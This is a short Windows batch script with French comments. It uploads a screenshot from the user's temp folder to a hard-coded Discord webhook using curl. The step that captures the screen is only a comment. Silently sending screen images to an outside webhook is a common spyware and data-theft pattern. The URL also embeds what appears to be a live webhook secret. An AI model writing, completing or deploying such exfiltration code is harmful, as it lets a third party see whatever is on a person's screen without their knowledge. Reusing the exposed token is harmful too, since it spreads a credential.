@echo off
setlocal enabledelayedexpansion

rem Définir l'URL du webhook Discord
set "webhookUrl=https://discord.com/api/webhooks/1151525024088477868/uRlaL-EA8gyLBxmjfzoZg5aAB1QT24phwo9XA13_rA2tai3rMHp2E7KqZEKN9sMS54kF"

rem Définir le chemin d'accès complet pour enregistrer la capture d'écran dans le répertoire temporaire de l'utilisateur
set "fileName=%TEMP%\screenshot.png"

rem Prendre une capture d'écran
rem (Assurez-vous d'avoir curl installé sur votre système)

rem Sauvegarder la capture d'écran dans le répertoire temporaire
rem (Assurez-vous que l'image a été enregistrée avec le nom screenshot.png)
curl -X POST %webhookUrl% ^
    -H "Content-Type: multipart/form-data" ^
    -F "payload_json={\"embeds\":[{\"title\":\"Capture d'écran\",\"image\":{\"url\":\"attachment://screenshot.png\"}}]}" ^
    -F "file=@%fileName%"

echo Capture d'écran envoyée avec succès au webhook Discord.
